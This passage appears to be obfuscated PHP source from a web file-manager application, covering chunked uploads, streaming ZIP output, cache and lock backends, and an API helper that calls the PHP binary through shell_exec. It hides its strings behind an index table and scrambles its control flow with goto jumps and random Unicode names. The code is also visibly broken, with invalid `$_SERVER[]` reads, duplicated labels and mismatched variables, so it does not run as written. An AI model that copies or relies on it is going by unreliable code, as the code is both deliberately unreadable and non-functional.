$dꂒ = array($A笿[$cד[28]], $A笿[$cד[75]], $A笿[$cד[77]], $A笿[$cד[455]]); return md5(implode($cד[70], $dꂒ)); } private static function localFilePath($f, $a˱޶) { goto EУ; e㱄: if ($Aփ == $EɞϠ[101] || $Aփ == $EɞϠ[1035]) { if (!$AҌ믄->exist($AҌ믄->path)) { show_json(LNG($EɞϠ[100]), !1); } return $AҌ믄->path; } return !1; goto fˍ; EУ: $EɞϠ =& $_SERVER[]; if ($a˱޶ == $EɞϠ[1032] && strtoupper(substr(PHP_OS, 0, 3)) == $EɞϠ[1033]) { return !1; } $f = KodIO::parse($f); goto c޻; c޻: if ($f[$EɞϠ[29]] == KodIO::KOD_SOURCE) { $b݃ = Model($EɞϠ[738])->fileInfoGet(KodIO::sourceID($f)); if (!$b݃[$EɞϠ[75]]) { show_json($EɞϠ[1034], !1); } $f = $b݃[$EɞϠ[75]]; } $AҌ믄 = self::init($f); $Aփ = $AҌ믄->getType(); goto e㱄; fˍ: } private static function archiveExt($bŒ֓ = '') { $GLOBALS[$_SERVER[][1036]] = $bŒ֓; } } goto bѧߘ; D: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto F¿; C: if (!empty($_FILES)) { $B˄ = $_FILES[$e[163]]; $this->uploadFile = $B˄[$e[1931]]; if (!$this->uploadFile && $B˄[$e[1198]] > 0) { show_json($this->errorInfo($B˄[$e[1198]]), !1); } } else { if (isset($in[$e[382]])) { $this->uploadFile = isset($in[$e[1932]]) ? $e[1933] : $e[1778]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto fʡ; fʡ: $this->checkSize(); $this->tempPathInit(); goto Eë; F¿: $e =& $_SERVER[]; global $in; $this->in =& $in; goto C; Eë: } public function upload() { goto B˦; cث: CacheLock::lock($this->tempFile, 20); $C˧ = $this->statusGet(); $this->initFileTemp(); goto e􄎺; E˥: ignore_timeout(); if (!$this->checkChunkHash($C˧)) { $this->showJson($C[1948], !1); } $this->statusSet(!1); goto cؚᒎ; cꨡ: @unlink($Dᕿ); if (!$A) { $this->showJson($C[1942] . $CڅՖ, !1); } $C˧[$C[1943]] = $B; goto fĥ܃; B˦: $C =& $_SERVER[]; $CڅՖ = isset($this->in[$C[1934]]) ? intval($this->in[$C[1934]]) : 0; $B = isset($this->in[$C[1935]]) ? intval($this->in[$C[1935]]) : 1; goto b; cܚßġ: $fʹ = $CڅՖ * $Bᠺϧ; $f̻ = @fopen($this->tempFile, $C[1941]); fseek($f̻, $fʹ); goto f®; f®: $A = $this->writeTo($Dᕿ, $f̻, $this->tempFile); $D񌃬׊ = IO::hashSimple($Dᕿ); $eňЬ = IO::size($Dᕿ); goto cꨡ; cؚᒎ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto A; b: $EΌ = $this->tempFile . $C[1936] . $CڅՖ; $eňЬ = isset($this->in[$C[516]]) ? intval($this->in[$C[516]]) : 0; $Bᠺϧ = isset($this->in[$C[1937]]) ? intval($this->in[$C[1937]]) : 0; goto cѠ; cѠ: if ($B > 1 && $Bᠺϧ <= 0) { show_json($C[1938], !1); } if ($Bᠺϧ > $eňЬ) { $B = 1; } if ($B <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto cث; e􄎺: $Dᕿ = $this->moveUploadedFile($EΌ); if ($eňЬ > 0 && filesize($Dᕿ) == 0) { $this->showJson($C[1939], !1); } if (!$Dᕿ) { $this->showJson(LNG($C[1940]), !1); } goto cܚßġ; fĥ܃: $C˧[$C[1944]][$C[1945] . $CڅՖ] = array($C[1946] => $fʹ, $C[1023] => $CڅՖ, $C[77] => $eňЬ, $C[160] => $D񌃬׊); $this->statusSet($C˧); if (count($C˧[$C[1944]]) != $C˧[$C[1943]]) { $this->showJson($C[1947] . $CڅՖ, !0); } goto E˥; A: } private function checkSize() { $Fσ =& $_SERVER[]; if (phpBuild64() || $this->in[$Fσ[77]] < PHP_INT_MAX) { return; } show_json(LNG($Fσ[1949]), !1); } private function showJson($eƝ, $B) { CacheLock::unlock($this->tempFile); if (!$B) { return show_json($eƝ, $B); } show_json($eƝ, $B); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto b򯏞; b򯏞: $F꧍ =& $_SERVER[]; $B = TEMP_FILES; @mk_dir($B); goto b; dǑ: $this->tempFile = $B . $F꧍[1952] . md5($a« . $this->in[$F꧍[1496]]); goto A蘕⫛; b: touch($B . $F꧍[1950]); $a« = isset($this->in[$F꧍[1951]]) ? $this->in[$F꧍[1951]] : !1; if (strlen($a«) < 30) { $a« = md5(USER_ID . $this->in[$F꧍[75]] . $this->fileName . $this->in[$F꧍[77]]); } goto dǑ; A蘕⫛: } private function moveUploadedFile($D) { $D׵ =& $_SERVER[]; $CË = $this->uploadFile; if ($CË == $D׵[1953]) { @file_put_contents($D, base64_decode($_REQUEST[$D׵[1954]])); } else { if ($CË == $D׵[1778]) { $F = @fopen($D, $D׵[1486]); $this->writeTo($CË, $F, $D); } else { if (!move_uploaded_file($CË, $D)) { return !1; } } } return $D; } private function writeTo($fޝ, $f͖ƕ, $fؠ) { goto Bऴ; D铷: $E걑 = @fopen($fޝ, $bΚ[1485]); if (!$E걑 || !$f͖ƕ || !$C) { CacheLock::unlock($f); return !1; } while (!feof($E걑)) { fwrite($f͖ƕ, fread($E걑, 1024 * 200)); } goto Bꪝ; b鮪: return !0; goto b; Bꪝ: fclose($E걑); fclose($f͖ƕ); CacheLock::unlock($f); goto b鮪; Bऴ: $bΚ =& $_SERVER[]; $f = $bΚ[1955] . $fؠ; $C = CacheLock::lock($f, 1); goto D铷; b: } private function statusGet() { goto e; Bᆳ: if (!$this->statusData) { $B󵒅 = array($bԏ[28] => $this->fileName, $bԏ[1943] => 0, $bԏ[1944] => array()); $this->statusSet($B󵒅); } return $this->statusData; goto Bߑ҈; e: $bԏ =& $_SERVER[]; if (is_array($this->statusData)) { return $this->statusData; } $F񠖖 = $this->tempFile . $bԏ[1956]; goto e뤏ɢП; e뤏ɢП: $AԾ = !1; if (file_exists($F񠖖)) { $AԾ = @file_get_contents($F񠖖); } if ($AԾ) { $this->statusData = json_decode($AԾ, !0); } goto Bᆳ; Bߑ҈: } public function statusSet($eؤ) { $A = $this->tempFile . $_SERVER[][1956]; if (!$eؤ) { if (file_exists($A)) { @unlink($A); } return !0; } $this->statusData = $eؤ; return file_put_contents($A, json_encode($eؤ)); } private function initFileTemp() { $cި =& $_SERVER[]; if (file_exists($this->tempFile)) { return; } $c˜ = fopen($this->tempFile, $cި[1957]); fseek($c˜, $this->in[$cި[77]] - 1, SEEK_SET); fwrite($c˜, $cި[464]); fclose($c˜); } public function checkChunk() { goto Eɏ; e슻: $Fވ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($Fވ[$d[1944]] as $a烟) { $Aק = $a烟[$d[160]]; if ($Aק) { $BͳЎ[$d[1958] . $a烟[$d[1023]]] = $Aק; } } goto A󔊈; A󔊈: return $BͳЎ; goto eׅ; Eɏ: $d =& $_SERVER[]; $BͳЎ = array(); CacheLock::lock($this->tempFile); goto e슻; eׅ: } private function checkChunkHash($BЕ) { goto A; cӾ㤃: return $F; goto b; A: $D̰ =& $_SERVER[]; if (count($BЕ[$D̰[1944]]) != $BЕ[$D̰[1943]]) { return !1; } $Dы = _get($this->in, $D̰[1951]); goto a; c߈Ȏ: $F = !0; foreach ($BЕ[$D̰[1944]] as $Cٳ) { fseek($CӔݷ, $Cٳ[$D̰[1946]]); $dę = PathDriverStream::hash($CӔݷ, $Cٳ[$D̰[77]]); if ($Cٳ[$D̰[160]] != $dę) { $F = !1; break; } } fclose($CӔݷ); goto cӾ㤃; a: $Bԙĭ = _get($this->in, $D̰[1959]); if (strlen($Bԙĭ) == 32 && IO::hashSimple($this->tempFile) == $Dы && IO::hashMd5($this->tempFile) == $Bԙĭ) { return !0; } $CӔݷ = fopen($this->tempFile, $D̰[1149]); goto c߈Ȏ; b: } public static function fileName() { goto E鄜; E鄜: $dۉ =& $_SERVER[]; global $in; $eߊӹ = isset($in[$dۉ[28]]) ? $in[$dۉ[28]] : $dۉ[33]; goto D; Eِ: if ($AҔ == $dۉ[1961] || $AҔ == $dۉ[1962]) { $eߊӹ = date($dۉ[676], $bˎ) . $dۉ[70] . $in[$dۉ[77]] . $dۉ[1593]; } else { if ($AҔ == $dۉ[1963]) { $eߊӹ = date($dۉ[676], $bˎ) . $dۉ[70] . $in[$dۉ[77]] . $dۉ[1964]; } } return $eߊӹ; goto d; D: if (!empty($_FILES)) { $eߊӹ = $eߊӹ ? $eߊӹ : $_FILES[$dۉ[163]][$dۉ[382]]; } $eߊӹ = str_replace(array($dۉ[93], $dۉ[8]), array($dۉ[8], $dۉ[91]), trim($eߊӹ)); if (!is_wap()) { return $eߊӹ; } goto E갆ӝ; E갆ӝ: $bˎ = strtotime($in[$dۉ[1960]]); $bˎ = $bˎ ? $bˎ : time(); $AҔ = strtolower($eߊӹ); goto Eِ; d: } private function errorInfo($FԿʴ) { $AŃɥ =& $_SERVER[]; $fꈨ֢ = array($AŃɥ[1965], $AŃɥ[1966], $AŃɥ[1967], $AŃɥ[1968], $AŃɥ[1969], $AŃɥ[1970], $AŃɥ[1971], $AŃɥ[1972]); return $FԿʴ . $AŃɥ[4] . $fꈨ֢[$FԿʴ]; } } class ZipMake { const VERSION = "\60\56\x32\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($b = null) { $Aȗ =& $_SERVER[]; $this->outputStream = fopen($Aȗ[1973], $Aȗ[1205]); $this->outputName = $b; $this->needHeaders = !0; } public function addFile($b˭덨, $Aɏ) { goto b; F˅: $this->addFileFooter($b˭덨, $cƻ, $e۰, $fՋٱ, $F, $Cͧ); goto C; b: $d =& $_SERVER[]; $b˭덨 = $this->filterFilename($b˭덨); $cƻ = static::METHOD_STORE; goto fֵ; dԗ: while (!feof($b)) { $CЦޭ = fread($b, 1048576); $this->send($CЦޭ); } fclose($b); $e۰ = hexdec(hash_file($d[1975], $Aɏ)); goto F˅; fֵ: $Cͧ = $this->addFileHeader($b˭덨, $cƻ); $fՋٱ = $F = filesize($Aɏ); $b = fopen($Aɏ, $d[1974]); goto dԗ; C: } public function addFileFromStream($Cӓ, $Cݍ) { goto B; dՉ: $F눈Ӹ = hash_init($_SERVER[][1975]); while (!feof($Cݍ)) { $eÍƠ = fread($Cݍ, 1048576); hash_update($F눈Ӹ, $eÍƠ); $this->send($eÍƠ); } $F˂լ = hexdec(hash_final($F눈Ӹ)); goto A; A: $this->addFileFooter($Cӓ, $bۘƯ, $F˂լ, $dڈ, $AΧ, $c̋); goto cʧֹ; B: $Cӓ = $this->filterFilename($Cӓ); $bۘƯ = static::METHOD_STORE; $c̋ = $this->addFileHeader($Cӓ, $bۘƯ); goto dĵ; dĵ: fseek($Cݍ, 0, SEEK_END); $dڈ = $AΧ = ftell($Cݍ); rewind($Cݍ); goto dՉ; cʧֹ: } public function finish() { foreach ($this->files as $CՎ) { $this->addCdrFile($CՎ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($E厉ϥ, $f␓) { goto c; d틓ʆ: $C¶ = $this->dosTime(time()); $Fʄ֗ = array(array($cᕱ[1977], static::FILE_HEADER_SIGNATURE), array($cᕱ[1978], static::ZIP_VERSION_64), array($cᕱ[1978], 8), array($cᕱ[1978], $f␓), array($cᕱ[1977], $C¶), array($cᕱ[1977], 0), array($cᕱ[1977], 4294967295), array($cᕱ[1977], 4294967295), array($cᕱ[1978], $D), array($cᕱ[1978], 32)); $Aڤ = array(array($cᕱ[1978], 1), array($cᕱ[1978], 28), array($cᕱ[1979], 0), array($cᕱ[1979], 0), array($cᕱ[1979], 0), array($cᕱ[1977], 0)); goto A; A: $A = $this->packFields($Fʄ֗); $f勃Ջ = $this->packFields($Aڤ); $this->send($A . $E厉ϥ . $f勃Ջ); goto D; D: return strlen($A) + $D + strlen($f勃Ջ); goto A; c: $cᕱ =& $_SERVER[]; $E厉ϥ = preg_replace($cᕱ[1976], $cᕱ[33], $E厉ϥ); $D = strlen($E厉ϥ); goto d틓ʆ; A: } protected function addFileFooter($E˩, $c, $a֬, $c, $Aۤ, $Fڶ) { $Fϱ =& $_SERVER[]; $F؋ = array(array($Fϱ[1977], static::DATA_DESCRIPTOR_SIGNATURE), array($Fϱ[1977], $a֬), array($Fϱ[1979], $c), array($Fϱ[1979], $Aۤ)); $f֌ = $this->packFields($F؋); $this->send($f֌); $A޽ = $Fڶ + $c + $aՋ; $this->addToCdr($E˩, $c, $a֬, $c, $Aۤ, $A޽); } private function addToCdr($D, $Aӳ, $EǕ, $f, $aԄΏ, $b༿) { $this->files[] = array($D, $Aӳ, $EǕ, $f, $aԄΏ, $this->ofs); $this->ofs += $b༿; } protected function addCdrFile($b૞) { goto B܆; B܆: $FկѤ =& $_SERVER[]; list($D֙Ͼ, $Dɫ, $B, $F, $D, $aؒ) = $b૞; $D = $FկѤ[33]; goto D; Eˋ: $CΨ = $this->packFields($eĉ); $E = $this->packFields($d); $d = $CΨ . $D֙Ͼ . $D . $E; goto Fڧ; Fڧ: $this->send($d); $this->cdr_ofs += strlen($d); goto fڬ; D: $E㫙 = $this->dosTime(time()); $eĉ = array(array($FկѤ[1977], static::CDR_FILE_SIGNATURE), array($FկѤ[1978], static::ZIP_VERSION_64), array($FկѤ[1978], static::ZIP_VERSION_64), array($FկѤ[1978], 8), array($FկѤ[1978], $Dɫ), array($FկѤ[1977], $E㫙), array($FկѤ[1977], $B), array($FկѤ[1977], 4294967295), array($FկѤ[1977], 4294967295), array($FկѤ[1978], strlen($D֙Ͼ)), array($FկѤ[1978], 32), array($FկѤ[1978], strlen($D)), array($FկѤ[1978], 0), array($FկѤ[1978], 0), array($FկѤ[1977], 32), array($FկѤ[1977], 4294967295)); $d = array(array($FկѤ[1978], 1), array($FկѤ[1978], 28), array($FկѤ[1979], $D), array($FկѤ[1979], $F), array($FկѤ[1979], $aؒ), array($FկѤ[1977], 0)); goto Eˋ; fڬ: } protected function addCdr64Eof() { goto DՎ; cՊ: $this->send($CɄ); goto Aل; DՎ: $f =& $_SERVER[]; $Aȑ = count($this->files); $cˇ = $this->cdr_ofs; goto eх; eх: $F؃̑ = $this->ofs; $d܏ = array(array($f[1977], static::ZIP64_CDR_EOF_SIGNATURE), array($f[1979], 44), array($f[1978], static::ZIP_VERSION_64), array($f[1978], static::ZIP_VERSION_64), array($f[1977], 0), array($f[1977], 0), array($f[1979], $Aȑ), array($f[1979], $Aȑ), array($f[1979], $cˇ), array($f[1979], $F؃̑)); $CɄ = $this->packFields($d܏); goto cՊ; Aل: } protected function addCdr64Locator() { goto B󡒻; Cʗ: $this->send($Fˮޜ); goto FϤӑ; B󡒻: $Cռ =& $_SERVER[]; $FË = count($this->files); $B秶 = $this->cdr_ofs; goto bԧŲ; bԧŲ: $B = $this->ofs; $B = array(array($Cռ[1977], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($Cռ[1977], 0), array($Cռ[1979], $B + $B秶), array($Cռ[1977], 1)); $Fˮޜ = $this->packFields($B); goto Cʗ; FϤӑ: } protected function addCdrEof() { goto B꾏; B: $C = $this->ofs; $aϊނٷ = $a[33]; $dۆ = array(array($a[1977], static::CDR_EOF_SIGNATURE), array($a[1978], 0), array($a[1978], 0), array($a[1978], $B), array($a[1978], $B), array($a[1977], 4294967295), array($a[1977], 4294967295), array($a[1978], strlen($aϊނٷ))); goto Eܰ; B꾏: $a =& $_SERVER[]; $B = count($this->files); $c = $this->cdr_ofs; goto B; Eܰ: $D = $this->packFields($dۆ) . $aϊނٷ; $this->send($D); goto f؃Ō; f؃Ō: } protected function addCdr() { foreach ($this->files as $fمέ) { $this->addCdrFile($fمέ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $AË =& $_SERVER[]; $aՄ = $AË[198]; if ($this->outputName) { $eȦ = trim(str_replace(array($AË[112], $AË[55], $AË[93], $AË[67], $AË[213], $AË[979]), $AË[33], $this->outputName)); $A = rawurlencode($eȦ); $aՄ .= "\73\40\146\x69\x6c\145\x6e\141\x6d\x65\52\75\x75\164\x66\55\70\x27\x27{$A}"; } $e͋Ű = array($AË[195] => $AË[1980], $AË[1981] => $aՄ, $AË[1982] => $AË[1983], $AË[1984] => $AË[1985], $AË[1986] => $AË[1987]); foreach ($e͋Ű as $d => $b) { header($d . $AË[866] . $b); } } protected function send($D·) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $D·); } protected final function dosTime($eʼ) { $d썆 =& $_SERVER[]; $F = getdate($eʼ); if ($F[$d썆[1690]] < 1980) { $F = array($d썆[1690] => 1980, $d썆[1988] => 1, $d썆[1989] => 1, $d썆[1990] => 0, $d썆[1991] => 0, $d썆[1992] => 0); } $F[$d썆[1690]] -= 1980; return $F[$d썆[1690]] << 25 | $F[$d썆[1988]] << 21 | $F[$d썆[1989]] << 16 | $F[$d썆[1990]] << 11 | $F[$d썆[1991]] << 5 | $F[$d썆[1992]] >> 1; } protected function packFields($D) { $a =& $_SERVER[]; $Bݎ = $a[33]; $b𙂵 = array(); foreach ($D as $BԼ) { $Bݎ .= $BԼ[0]; $b𙂵[] = $BԼ[1]; } array_unshift($b𙂵, $Bݎ); return call_user_func_array($a[1993], $b𙂵); } protected function filterFilename($d愍) { $eؚ =& $_SERVER[]; return str_replace(array($eؚ[93], $eؚ[4], $eؚ[172], $eؚ[69], $eؚ[112], $eؚ[911], $eؚ[914], $eؚ[267]), $eؚ[70], $d愍); } } class ZipStream { } goto BĲ; e: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto E; C: switch ($dؼ܅[$aǜ[739]]) { case $aǜ[17]: self::$handle = Model($aǜ[741]); break; case $aǜ[742]: self::$handle = new CacheRedis($D賆, $c珣ݙ); break; case $aǜ[743]: self::$handle = new CacheMemcached($D賆, $c珣ݙ); break; case $aǜ[163]: self::$handle = new CacheFile($D賆, $c珣ݙ); break; default: break; } return self::$handle; goto a; Dؙ: $dؼ܅ = $GLOBALS[$aǜ[6]][$aǜ[333]]; $D賆 = $dؼ܅[$dؼ܅[$aǜ[739]]]; $c珣ݙ = $dؼ܅[$aǜ[740]]; goto C; E: $aǜ =& $_SERVER[]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Dؙ; a: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Eꖥ) { if (is_array($Eꖥ) || is_object($Eꖥ)) { $Eꖥ = json_encode($Eꖥ); } $Eꖥ = rawurlencode($Eꖥ); return KOD_SITE_ID . $_SERVER[][70] . $Eꖥ; } public static function get($dȯ) { $B = self::key($dȯ); if (!isset(self::$memoryCache[$B])) { $D˹ = self::init()->get($B); self::$memoryCache[$B] = unserialize($D˹); } return self::$memoryCache[$B]; } public static function set($b, $aً, $bۇ = false) { goto f; C·: CacheLock::unlock($b); return $c߱; goto C󟡡; f: $d = self::key($b); if (isset(self::$memoryCache[$d]) && self::$memoryCache[$d] === $aً) { return !0; } if ($bۇ === 0) { self::$memoryCache[$d] = $aً; return !0; } goto f; f: CacheLock::lock($b); $c߱ = self::init()->set($d, serialize($aً), $bۇ); self::$memoryCache[$d] = $aً; goto C·; C󟡡: } public static function remove($bȉ) { goto Dŕ݆; E徕: CacheLock::lock($bȉ); $e = self::init()->remove($D֌); CacheLock::unlock($bȉ); goto Bӽߐ; Bӽߐ: return $e; goto d㸟; Dŕ݆: $D֌ = self::key($bȉ); unset(self::$memoryCache[$D֌]); self::clearTimeout(); goto E徕; d㸟: } public static function clearMemory($E = false) { if ($E) { $E = self::key($E); unset(self::$memoryCache[$E]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[][744])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[][745])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Bϔ, $c) { $B =& $_SERVER[]; $this->cachePath = $Bϔ[$B[75]]; $this->prefix = $B[746]; $this->cacheTime = $c; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($e) { $C =& $_SERVER[]; $e = str_replace(array($C[747], $C[93], $C[69]), $C[748], $e); return $this->cachePath . $C[749] . $e . $C[750]; } public function set($D, $c϶ٯ, $E굞웓 = false) { $AŃ = $this->getFile($D); if (file_put_contents($AŃ, $this->prefix . $c϶ٯ, LOCK_EX)) { return !0; } @unlink($AŃ); return !1; } public function get($C) { $EҊ = $this->getFile($C); if (file_exists($EҊ) && filemtime($EҊ) < time() - $this->cacheTime) { @unlink($EҊ); return !1; } $eӏݷ = @file_get_contents($EҊ); return substr($eӏݷ, strlen($this->prefix)); } public function remove($fܦᜍ) { $DӍ = $this->getFile($fܦᜍ); return @unlink($DӍ); } public function deleteAll() { $f =& $_SERVER[]; $Cĕْ = scandir($this->cachePath); foreach ($Cĕْ as $f잜) { $a𯰎 = $this->cachePath . $f잜; if (strpos($a𯰎, $f[750]) && strpos($a𯰎, $f[751])) { @unlink($a𯰎); } } } public function clearTimeout() { $b頂ϣ =& $_SERVER[]; $d = scandir($this->cachePath); foreach ($d as $bָ) { $F = $this->cachePath . $bָ; if (strpos($F, $b頂ϣ[750]) && strpos($F, $b頂ϣ[751]) && filemtime($F) < time() - $this->cacheTime) { @unlink($F); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto d; F: self::$timeout = $Aђ[$f[752]] ? $Aђ[$f[752]] : 10; $e낕 = _get($GLOBALS[$f[6]], $f[753]); $aΚ = $Aђ[$f[739]] ? $Aђ[$f[739]] : $f[163]; goto f힣; d: $f =& $_SERVER[]; if (self::$handle) { return self::$handle; } $Aђ = $GLOBALS[$f[6]][$f[333]]; goto F; f힣: if ($aΚ == $f[17] && $e낕 == $f[9]) { $aΚ = $f[163]; } switch ($aΚ) { case $f[742]: self::$handle = new CacheLockRedis(); break; case $f[743]: self::$handle = new CacheLockMemcached(); break; case $f[17]: self::$handle = new CacheLockDatabase(); break; case $f[163]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto B; B: } private static function key($a) { return $_SERVER[][754] . Cache::key($a); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($fˆٌ = '') { self::$errorMsg = $fˆٌ; } public static function lockGlobal($DҼز, $BĂ) { return self::lock($DҼز, $BĂ, !0); } public static function lock($Cٖ, $cԨ = false, $CƩ = false) { goto b; fӉ: $cԨ = $cԨ ? $cԨ : self::$timeout; $eԾ = $F֣ڋ->lock($b, $cԨ); if (!$eԾ) { $c = $A㇇[755] . $cԨ . $A㇇[67] . self::$errorMsg . $A㇇[67] . get_caller_msg(); $d¨ = "\114\x6f\143\x6b\x20\141\143\164\x69\x6f\156\x3a\x20{$b}\x20\x74\151\x6d\145\157\x75\x74\x2c\x6f\166\145\x72\40{$cԨ}\x20\163"; $d¨ = self::$errorMsg ? self::$errorMsg : $dֽ; write_log($c, $A㇇[756]); show_json($d¨, !1); } goto b; b: $A㇇ =& $_SERVER[]; $F֣ڋ = self::init(); $b = self::key($Cٖ); goto fӉ; b: if (!$CƩ) { self::$lockItem[$b] = !0; } return $eԾ; goto C; C: } public static function lockGet($Fǂ) { $e = self::key($Fǂ); if (self::$lockItem[$e]) { return self::$lockItem[$e]; } return self::init()->lockGet($e); } public static function unlock($Fǧ) { $BҎ = self::key($Fǧ); self::$lockItem[$BҎ] = null; return self::init()->unlock($BҎ); } public static function unlockRuntime() { $aͥ =& $_SERVER[]; $fÎ = self::init(); $bӾ֟ = !1; foreach (self::$lockItem as $c߉Ҋ => $cۛ) { if (!$cۛ) { continue; } $fÎ->unlock($c߉Ҋ); if (!$bӾ֟) { $bӾ֟ = !0; write_log($aͥ[757] . $c߉Ҋ . $aͥ[67] . get_caller_msg(), $aͥ[756]); continue; } write_log($aͥ[757] . $c߉Ҋ, $aͥ[756]); } } } goto a؅; C: function ActionCall($Cǎ) { $Cԅ = array_slice(func_get_args(), 1); return ActionApply($Cǎ, $Cԅ); } function ActionCallApi($aʤǑڅ, $Eŧ = '') { goto C; C: $a =& $_SERVER[]; $cϩ = $Eŧ; if (is_array($Eŧ)) { $cϩ = $a[20]; foreach ($Eŧ as $b먲ц => $dޗկ) { $dޗկ = is_array($dޗկ) ? json_encode($dޗկ) : $dޗկ; $dޗկ = is_bool($dޗկ) ? intval($dޗկ) : $dޗկ; $cϩ .= $a[21] . $b먲ц . $a[22] . rawurlencode($dޗկ); } } goto Dǆ; cŇ: $aî볐 = json_decode($C, !0); $fҋ = is_array($aî볐) ? $aî볐 : array($a[33] => null, $a[34] => $C); if (!$aî볐) { echo $C; } goto a; a: return $fҋ; goto d΋ɤ; Dǆ: $B = Action($a[23])->accessToken(); $aʤǑڅ = str_replace($a[5], $a[4], $aʤǑڅ) . $a[24] . $B . $cϩ; $C = $a[20]; goto B; B: $d̩޽ = phpBinCommand(); if ($d̩޽ && function_exists($a[25])) { $c֬ӈ˂ = $d̩޽ . $a[26] . BASIC_PATH . $a[27] . escapeshellarg($aʤǑڅ); $C = shell_exec($c֬ӈ˂); } if (!$C) { $a = stream_context_create(array($a[28] => array($a[29] => 20, $a[30] => $a[31]))); $C = file_get_contents(APP_HOST . $a[32] . $aʤǑڅ, !1, $a); } goto cŇ; d΋ɤ: } function ActionCallHook($e񨓖) { goto dԣ; fݱݟ: $GLOBALS[$aϋÃÂ[35]] = 1; $C = ActionApply($e񨓖, $bŊ); $CϢ = ob_get_clean(); goto bո; dԣ: $aϋÃÂ =& $_SERVER[]; ob_start(); $bŊ = array_slice(func_get_args(), 1); goto fݱݟ; bո: $C = $CϢ ? json_decode($CϢ, !0) : $C; $GLOBALS[$aϋÃÂ[35]] = 0; return $C; goto C㊽; C㊽: } goto AŤ; dق: class CacheLockMemcached { public function lock($dʳÑ, $B֛ = 0) { $e = Cache::init(); $b񕜋 = microtime(!0) + $B֛; while (microtime(!0) < $b񕜋) { $B = $e->get($dʳÑ); if (!$B || $B < microtime(!0)) { $BįД = $e->handle->add($dʳÑ, $b񕜋, $B֛); if ($BįД) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($aÌ) { return Cache::init()->get($aÌ); } public function unlock($A݈ߝ) { return Cache::init()->remove($A݈ߝ); } } class CacheLockDatabase { public function lock($e񅤧ɂ, $e܋ = 0) { $B = Model($_SERVER[][741]); $E븙 = microtime(!0) + $e܋; while (microtime(!0) < $E븙) { $A᱑ݯ = $B->get($e񅤧ɂ); if (!$A᱑ݯ || $A᱑ݯ < microtime(!0)) { $eӍ = $B->set($e񅤧ɂ, $E븙); if ($eӍ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($c琶) { return Model($_SERVER[][741])->get($c琶); } public function unlock($CҌ) { Model($_SERVER[][741])->remove($CҌ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($aˤ, $Bϫ) { $E圆а =& $_SERVER[]; if (!class_exists($E圆а[762])) { show_json($E圆а[763], !1); } $this->cacheTime = $Bϫ; $this->handle = new Memcached(); if (is_array($aˤ[$E圆а[764]]) && count($aˤ[$E圆а[764]]) >= 1) { foreach ($aˤ[$E圆а[764]] as $D) { $A֣ܐ = explode($E圆а[4], $D); $this->handle->addServer($A֣ܐ[0], $A֣ܐ[1]); } } else { $this->handle->addServer($aˤ[$E圆а[165]], $aˤ[$E圆а[166]]); } } public function set($Aō, $fû, $BÃ = false) { $BÃ = $BÃ ? $BÃ : $this->cacheTime; return $this->handle->set($Aō, $fû, $BÃ); } public function get($F񺍚) { return $this->handle->get($F񺍚); } public function remove($AԲ) { return $this->handle->delete($AԲ); } public function deleteAll() { return $this->handle->flush(); } } goto eٓǌ; BĲ: class AnalysisModel extends ModelBaseLight { public function init($Cƒ) { $fӎ =& $_SERVER[]; $B = array($fӎ[531] => array($fӎ[29] => $fӎ[1994], $fӎ[257] => array($fӎ[206], $fӎ[686], $fӎ[1995], $fӎ[1996])), $fӎ[1997] => array($fӎ[29] => $fӎ[1998], $fӎ[257] => array($fӎ[206], $fӎ[684], $fӎ[1999], $fӎ[2000], $fӎ[2001]))); if (!isset($B[$Cƒ])) { return !1; } $this->optionType = $B[$Cƒ][$fӎ[29]]; $this->field = $B[$Cƒ][$fӎ[257]]; return !0; } public function listData($F؄ = false, $C߯ = "\155\157\144\x69\x66\x79\x54\x69\155\x65", $f·ҹ = false) { return parent::listData($F؄, $C߯, $f·ҹ); } public function trendList($fۯƴ) { goto Cɇ߅; fǻ: foreach ($f as $Fک) { $this->{$Bɟ}($Fک); } return $this->listData(); goto b; Cɇ߅: $c =& $_SERVER[]; $E޷ȶ = $this->listData(); if ($E޷ȶ) { $d = end($E޷ȶ); $Fک = date($c[2002], strtotime($c[2003])); if ($d[$c[206]] == $Fک) { return $E޷ȶ; } $C؇ = strtotime($d[$c[206]]); } goto d력; d력: if (!isset($C؇)) { $FõÂ = $fۯƴ == $c[531] ? $c[473] : $c[738]; $C؇ = 